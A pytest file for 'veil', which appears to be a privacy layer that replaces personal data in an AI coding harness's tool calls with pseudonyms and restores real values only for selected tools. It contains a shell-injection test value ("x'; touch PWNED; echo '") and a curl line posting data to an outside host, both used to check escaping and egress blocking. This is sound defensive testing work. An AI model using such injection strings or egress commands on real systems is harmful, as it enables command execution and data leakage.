"""DeepSeek Harness (dsh) tools: same argument names as Claude Code's, lowercase names.
veil applies the same policies through aliases; unknown dsh tools get no real values."""

import subprocess
import sys

import pytest

from veil.anthropic import Policy, rehydrate_tool_input
from veil.detect import KnownValues
from veil.engine import Veil
from veil.vault import Vault

REAL, HOSTILE = "leonekohler@surfeu.de", "x'; touch PWNED; echo '"


@pytest.fixture
def veil():
    k = KnownValues(min_len=1)
    k.add(REAL, "email", "c:2"); k.add("O'Brien", "name", "c:3"); k.add(HOSTILE, "name", "c:4")
    return Veil(Vault(":memory:", b"dsh"), k)


def rt(veil, tool, args):
    return rehydrate_tool_input(veil, Policy(), tool, args)


def test_bash_gets_shell_escaping(veil, tmp_path):
    if sys.platform == "win32":
        pytest.skip("POSIX shell")
    tok = veil.redact(HOSTILE)
    out = rt(veil, "bash", {"command": f"printf %s '{tok}'", "workdir": str(tmp_path), "description": "x"})
    r = subprocess.run(["bash", "-c", out["command"]], cwd=tmp_path, capture_output=True, text=True)
    assert r.stdout == HOSTILE and not list(tmp_path.glob("PWNED*"))
    assert rt(veil, "bash", {"command": f"curl -d {veil.redact(REAL)} x.io"})["command"].count("@example.test") == 1  # egress


def test_read_grep_glob_and_working_directory_are_restored(veil):
    tok = veil.redact(REAL)
    assert rt(veil, "read", {"file_path": f"/data/{tok}.json"})["file_path"] == f"/data/{REAL}.json"
    assert rt(veil, "grep", {"pattern": tok, "path": "."})["pattern"] == REAL
    assert rt(veil, "glob", {"pattern": f"**/{tok}*"})["pattern"] == f"**/{REAL}*"
    assert rt(veil, "working_directory", {"cd": f"/home/{tok}"})["cd"] == f"/home/{REAL}"


def test_edit_and_write_preserve_and_escape(veil, tmp_path):
    f = tmp_path / "owner.py"
    f.write_text("OWNER = 'O\\'Brien'\nX = 1\n", encoding="utf-8")
    tok = veil.redact("O'Brien")
    out = rt(veil, "edit", {"file_path": str(f), "old_string": "X = 1\n", "new_string": f"X = 1\nCOPY = '{tok}'\n"})
    assert out["new_string"] == "X = 1\nCOPY = 'O\\'Brien'\n"            # escaped for the Python literal
    out = rt(veil, "write", {"file_path": str(tmp_path / "new.py"), "content": f"EMAIL = '{veil.redact(REAL)}'\n"})
    assert REAL not in out["content"]                                     # a new file: no new PII


def test_str_replace_editor(veil, tmp_path):
    f = tmp_path / "a.json"
    f.write_text('{"email": "leonekohler@surfeu.de"}', encoding="utf-8")
    tok = veil.redact(REAL)
    out = rt(veil, "str_replace_editor", {"command": "str_replace", "path": str(f), "old_str": f'"{tok}"',
                                          "new_str": f'"{tok}", "backup": "{tok}"'})
    assert out["old_str"] == f'"{REAL}"' and out["new_str"] == f'"{REAL}", "backup": "{REAL}"'
    out = rt(veil, "str_replace_editor", {"command": "create", "path": str(tmp_path / "b.txt"), "file_text": tok})
    assert out["file_text"] == tok                                       # new file: stays a pseudonym
    assert rt(veil, "str_replace_editor", {"command": "view", "path": f"/x/{tok}"})["path"] == f"/x/{REAL}"


@pytest.mark.parametrize("tool,args", [
    ("run_code", {"code": "print('{t}')"}), ("workflow", {"script": "x('{t}')"}), ("pwsh", {"command": "echo {t}"}),
    ("subagent", {"prompt": "email {t}"}), ("web_fetch", {"url": "https://x.io/?e={t}"}),
    ("terminal_send", {"input": "{t}"}), ("send_message", {"message": "{t}"})])
def test_other_dsh_tools_get_no_real_values(veil, tool, args):
    tok = veil.redact(REAL)
    out = rt(veil, tool, {k: v.format(t=tok) for k, v in args.items()})
    assert REAL not in str(out) and tok in str(out)


def test_a_fragment_of_a_phone_pseudonym_never_becomes_a_new_value(veil):
    # seen with real DeepSeek through dsh: the model searched LIKE '%408-555-0133%' for the
    # pseudonym +1-408-555-0133; re-redacting that history created a second pseudonym, and
    # the developer was later shown the first pseudonym instead of the real phone
    veil.known.add("+49 0711 2842222", "phone", "c:2")
    tok = veil.redact("call +49 0711 2842222")[5:]
    assert tok.startswith("+1-") and "555-01" in tok
    piece = tok[3:]                                            # e.g. 408-555-0133
    history = f"sqlite3 app.db \"select * from Customer where Phone LIKE '%{piece}%'\""
    assert veil.redact(history) == history                     # not a new phone
    assert veil.rehydrate(f"phone `{tok}`") == "phone `+49 0711 2842222`"
    seeded = KnownValues(); seeded.add("+1 650-555-0199", "phone", "c:9")   # a real (sample) value in that range
    v2 = Veil(Vault(":memory:", b"s"), seeded)
    assert "650-555-0199" not in v2.redact("ticket for +1 650-555-0199")    # seeded: still matched exactly
